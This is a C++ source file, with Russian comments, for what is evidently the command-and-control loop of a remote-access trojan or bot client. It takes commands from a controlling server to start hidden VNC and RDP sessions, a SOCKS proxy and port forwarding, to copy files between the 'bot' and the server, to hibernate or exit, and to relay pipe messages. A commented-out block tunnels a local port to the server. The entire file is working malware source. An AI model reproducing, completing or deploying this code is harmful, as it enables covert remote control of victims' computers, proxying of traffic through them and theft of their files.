#include "core\core.h"
#include "core\debug.h"
#include "core\pipe.h"
#include <winsock2.h>
#include "WndRec\WndRec.h"
#include "WndRec\sender.h"
#include "WndRec\lzw.h"
#include "WndRec\manager.h"
#include "WndRec\socks.h"
#include "WndRec\portforward.h"
#include "WndRec\cmdexec.h"
#include "WndRec\stream.h"
#include "WndRec\FileTransfer.h"

namespace WndRec
{

struct TUNNEL_INFO
{
	SOCKET s1, s2;
	int idPort; //ид порта для восстановления связи, на сервере тоже будет такой ид
};

struct DataCmdExec
{
	ServerData* server;
	typeCallbackCmd callBackFunc;
};

const int ExecCmds[][2] =
{
	{ ID_PORTFORWARD_ON_OFF, ID_PORTFORWARD_ON_OFF },
	{ ID_EXIT, ID_EXIT },
	{ ID_RDP, ID_RDP },
	{ ID_VNC, ID_VNC },
	{ 23, 50 },
	{ 0, 0 }
};
/*
DWORD WINAPI Tunnel( void* data )
{
	TUNNEL_INFO* tunnelInfo = (TUNNEL_INFO*)data;
    DbgMsg("start tunnel %d<->%d", tunnelInfo->s1, tunnelInfo->s2 );
	bool stop = false;
    while( !stop )
    {
        fd_set fdsr;
        fdsr.fd_count = 2;
        fdsr.fd_array[0] = tunnelInfo->s1;
        fdsr.fd_array[1] = tunnelInfo->s2;

        if( API(WS2_32, select)( 0, &fdsr, NULL, NULL, NULL ) < 1 )
            break;
		DbgMsg( "1 select" );
        for( u_int i = 0; i < fdsr.fd_count; i++ )
        {
            char buf[1024];
            SOCKET hread = fdsr.fd_array[i];
            SOCKET hwrite = ((hread == tunnelInfo->s1) ? tunnelInfo->s2 : tunnelInfo->s1);
            int dw = API(WS2_32, recv)( hread, buf, sizeof(buf), 0 );
			DbgMsg( "1 r %d,%d", hread, dw );
			if( dw <= 0 ) 
			{
				stop = true;
				break;
			}
			if( API(WS2_32, send)( hwrite, buf, dw, 0 ) != dw )
			{
				stop = true;
				break;
			}
        }
    }
    DbgMsg("stop tunnel");
	Socket::Close(tunnelInfo->s1);
    Socket::Close(tunnelInfo->s2);
    Mem::Free(tunnelInfo);
    return 0;
}

static SOCKET StartPortForward( ServerData* server, char* data, int sz, bool notTunnel )
{
	SOCKET ret = 0;
	if( sz >= 10 )
	{
		int port = *((short*)(data + 4));
		int idPort = *((int*)(data + 6));
		SOCKET sc1 = 0;
		if( notTunnel )
		{
			DbgMsg( "id port %d", idPort );
		}
		else
		{
			DbgMsg( "connect port %d, id port %d", port, idPort );
			sc1 = Socket::ConnectIP( _CS_("127.0.0.1"), port ); //соединяемся с переданным портом
		}
		if( sc1 || notTunnel )
		{
			SOCKET sc2 = Socket::ConnectIP( GetIPServer(server), GetPortServer(server) );
			if( sc2 != 0 && WritePacket( server->buf, ID_PORT_FORWARD, sc2, data, sz ) ) //говорим серверу что нужно начать проброс порта
			{
				if( !notTunnel )
				{
					//запускаем туннель
					TUNNEL_INFO* tunnel = (TUNNEL_INFO*)Mem::Alloc( sizeof(TUNNEL_INFO) );
					tunnel->s1 = sc1;
					tunnel->s2 = sc2;
					tunnel->idPort = idPort;
					RunThread( Tunnel, tunnel );
				}
				else
					ret = sc2;
			}
			else
			{
				Socket::Close(sc1);
				Socket::Close(sc2);
			}
		}
	}
	return ret;
}
*/

static DWORD WINAPI MainCmdExec(void* param)
{
	ServerData* server = ((DataCmdExec*)param)->server;
	typeCallbackCmd callbackFunc = ((DataCmdExec*)param)->callBackFunc;
	bool stop = false;
	int paramIdExit = 0; //параметр для команды ID_EXIT
	DWORD lenOutData;

	Mem::Data inBufferCmd(4096); //буфер для входных данными
	Mem::Data outBufferCmd(4096); //буфер для исходящих данных
	FT_Init();
	
	if( server == 0 ) stop = true;

	while( !stop && server->c_ip > 0 )
    {
        int cmd = 0;
		uint id = 0;
        int sz = ReadCmd( server, cmd, id, ExecCmds, inBufferCmd, 2000 ); //ждем команду от сервера
		if( sz > 0 )
		{
			switch(cmd)
			{
				case ID_PORTFORWARD_ON_OFF: //соединяемся с сервером для проброса порта
					if( inBufferCmd.p_char()[0] )
						StartPortForward(server);
					else
						StopPortForward(server);
					break;
				case ID_EXIT:
					paramIdExit = *((int*)inBufferCmd.Ptr());
					if( paramIdExit == 10 || paramIdExit == 2 ) stop = true; //завершаем работу
					if( paramIdExit == 1 ) RunHibernation( server, 0 ); //входит в режим спячки
					break;
				case ID_SLEEP:
					{
						int time = *((int*)inBufferCmd.Ptr());
						RunHibernation( server, time );
					}
					break;
				case ID_RDP:
					if( callbackFunc )
					{
						if( callbackFunc( server, cmd, id, inBufferCmd.p_char(), sz, outBufferCmd.p_char(), outBufferCmd.Size(), &lenOutData ) )
						{
							if( outBufferCmd.p_char()[0] ) 
								StartPortForward(server);
						}
					}
					break;
				case ID_VNC:
				case ID_HVNC:
				case ID_VNCDLL:
					if( callbackFunc )
					{
						if( callbackFunc( server, cmd, id, inBufferCmd.p_char(), sz, outBufferCmd.p_char(), outBufferCmd.Size(), &lenOutData ) )
						{
							if( outBufferCmd.p_char()[0] == 1 ) 
								StartPortForward(server);
						}
					}
					break;
				case ID_DUPL:
					if( sz == sizeof(DWORD) )
					{
						ServerData* server2 = DuplicationServer( server, *((DWORD*)inBufferCmd.Ptr()) ); //создаем дублирующий сервер
						if( server2 )
						{
							WriteData( server2, ID_DUPL, inBufferCmd.Ptr(), sz ); //отсылаем в дублирующем сервере команду на проброс соединения
							RunCmdExec( server2, 0 );
						}
					}
					break;
				case ID_SOCKS_ON_OFF:
					if( inBufferCmd.p_char()[0] )
						StartSocks(server);
					else
						StopSocks(server);
					break;
				case ID_STREAM_RECREATE:
					if( sz >= 8 )
					{
						uint idOld = ((uint*)inBufferCmd.Ptr())[0];
						uint idNew = ((uint*)inBufferCmd.Ptr())[1];
						RecreateStream( server, idOld, idNew );
					}
					break;
				case ID_PIPE:
					{
						int len = inBufferCmd.p_byte()[0];
						char* namePipe = Str::Duplication( inBufferCmd.p_char() + 1, len );
						byte* data = inBufferCmd.p_byte() + len + 1;
						int c_data = *((ushort*)data);
						data += 2;
#ifdef WIN64
						//в структуре Pipe::Msg есть поле func размер которого x64 равно 8 байт, а сервер передает это поле размером 4 байта, поэтому вставляем дополнительно в это поле 4 байта
						inBufferCmd.Insert( len + 1 + 2 + (4 + 32) /*начало func  в структуре Pipe::Msg*/, data + len + 1 + 2 + (4 + 32), 4 );
						c_data += 4;
						Pipe::Msg m;
						DbgMsg( "** %d %d %d", sizeof(Pipe::Msg), sizeof(m.cmd), sizeof(m.func) );
#endif
						if( !PipeClient::Send( namePipe, data, c_data ) )
						{
							//если данные не удалось отослать (пайп канал не существует), то отослать указанную команду на сервер
							data += c_data;
							if( data + 10 <= inBufferCmd.PtrWrite() ) //6 - 4 - команда, +4 - ид пакета, +2 - размер отсылаемых данных
							{
								int cmd = *((int*)data);
								if( cmd > 0 )
								{
									data += 4;
									int id = *((int*)data);
									data += 4;
									c_data = *((ushort*)data);
									data += 2;
									if( data + c_data <= inBufferCmd.PtrWrite() )
										WndRec::WriteData( server, cmd, data, c_data, 0, id );
								}
							}
						}
						Str::Free(namePipe);
					}
					break;
				case ID_FT_DIR:
					FT_Dir( server, inBufferCmd.p_byte(), inBufferCmd.Len() );
					break;
				case ID_FT_COPY_SB:
					FT_CopyServer2Bot( server, inBufferCmd.p_byte(), inBufferCmd.Len() );
					break;
				case ID_FT_COPY_BS:
					FT_CopyBot2Server( server, inBufferCmd.p_byte(), inBufferCmd.Len() );
					break;
				case ID_FT_MKDIR:
					FT_MkDir( server, inBufferCmd.p_byte(), inBufferCmd.Len() );
					break;
				case ID_FT_DEL:
					FT_DelFile( server, inBufferCmd.p_byte(), inBufferCmd.Len() );
					break;
				case ID_FT_STOPCOPY:
					FT_StopCopy();
					break;
				default:
					if( callbackFunc )
						callbackFunc( server, cmd, id, inBufferCmd.p_char(), sz, outBufferCmd.p_char(), outBufferCmd.Size(), &lenOutData );
			}
		}
		if( sz == 0 ) //проблема с коннектом
			Delay(5000);
    }
	Mem::Free(param);
	if( paramIdExit == 10 ) API(KERNEL32, ExitProcess)(0);
	if( paramIdExit == 2 ) Release(server);
	return 0;
}

bool RunCmdExec( ServerData* server, typeCallbackCmd func )
{
	DataCmdExec* dce = (DataCmdExec*)Mem::Alloc( sizeof(DataCmdExec) );
	if( dce )
	{
		dce->server = server;
		dce->callBackFunc = func;
		return RunThread( MainCmdExec, dce );
	}
	return false;
}

}
